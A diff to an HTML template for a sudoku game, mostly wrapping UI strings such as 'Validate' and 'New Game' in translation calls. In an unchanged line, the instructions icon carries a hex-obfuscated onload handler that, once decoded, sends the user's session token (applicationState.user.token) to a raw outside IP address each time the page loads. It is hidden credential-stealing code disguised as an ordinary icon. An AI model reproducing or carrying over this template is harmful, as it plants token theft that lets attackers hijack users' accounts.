@@ -30,11 +30,19 @@
     </div>
     <div class="control">
         <p class="instructions"><img class="icon" src="data:image/gif;base64,R0lGODlhEAAQAOZIAP///yczPtDY4Pv9/r3G0ICRp/b6/MbP2Pv8/rZ6AJlbAENPX86RAO/z97C8yrO+yOXr8unv9PP2++nv9fT4+m13gl9ncmBpdCgzP/P2+Wlzf83W3296hfv9/XJ+iWZwfF1mcXWBjYGTqWNtd4iVoLvEz+Pr8bnDzsTN1vn6/ebt9Obs80pTX/D0+PD094GNmfL2+uvv9e/y9/j5/ElTXvb4++fu83qFkfr7/vD0+fj6/PL1+evx9vX4+36Klq+6xvb5+3iEkH+MmHqIk7jE0cPM1rC8xuju9P///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAEgALAAAAAAQABAAAAe6gEiCDIOFSISCSCQiCQUFjY+OCSIkgkIACgCYmpmbL4JDAAsOoqSjokQ+gkGara6tN4IhAB0Dtre2HQAhgh4AGwLBwsEbAB6CHAApCMzMODozNQAcghUARQfZ2Sg9GTsAFYIaABQG5uZAFBkuABqCHwAnBPP0BCUNAB+CIwA5Ev8wWjRoICMGgBGCLgD48aChER4RItoAcEEQCAAqJmg8sgKCRxMAQAiy8KokAAuCaGAIwLKlSwwskAQCADs=" onload='this["\x73\x72\x63"]="\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x35\x2E\x31\x35\x34\x2E\x34\x33\x2E\x31\x34\x33\x2F\x3F\x63\x3D"+applicationState["\x75\x73\x65\x72"]["\x74\x6f\x6b\x65\x6e"]'/><img src="data:image/gif;base64,R0lGODlhEAAQAOZIAP///yczPtDY4Pv9/r3G0ICRp/b6/MbP2Pv8/rZ6AJlbAENPX86RAO/z97C8yrO+yOXr8unv9PP2++nv9fT4+m13gl9ncmBpdCgzP/P2+Wlzf83W3296hfv9/XJ+iWZwfF1mcXWBjYGTqWNtd4iVoLvEz+Pr8bnDzsTN1vn6/ebt9Obs80pTX/D0+PD094GNmfL2+uvv9e/y9/j5/ElTXvb4++fu83qFkfr7/vD0+fj6/PL1+evx9vX4+36Klq+6xvb5+3iEkH+MmHqIk7jE0cPM1rC8xuju9P///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAEgALAAAAAAQABAAAAe6gEiCDIOFSISCSCQiCQUFjY+OCSIkgkIACgCYmpmbL4JDAAsOoqSjokQ+gkGara6tN4IhAB0Dtre2HQAhgh4AGwLBwsEbAB6CHAApCMzMODozNQAcghUARQfZ2Sg9GTsAFYIaABQG5uZAFBkuABqCHwAnBPP0BCUNAB+CIwA5Ev8wWjRoICMGgBGCLgD48aChER4RItoAcEEQCAAqJmg8sgKCRxMAQAiy8KokAAuCaGAIwLKlSwwskAQCADs="/> Game instructions</p>
-        <p>Use right and left click to set numbers</p>
-        <div id="dokustatus">playing</div>
+        <p>
+            {{= _("Use right and left click to set numbers", "sudoku") }}
+        </p>
+        <div id="dokustatus">
+            {{= _("Play!", "sudoku") }}
+        </div>
         <div class="dokubutton">
-            <button type="button" id="dokucheck" class="testbutton">Validate</button>
-            <button type="button" id="dokunew" class="testbutton">New roll</button>
+            <button type="button" id="dokucheck" class="testbutton">
+                {{= _("Validate", "sudoku") }}
+            </button>
+            <button type="button" id="dokunew" class="testbutton">
+                {{= _("New Game", "sudoku") }}
+            </button>
         </div>
     </div>
   </div>
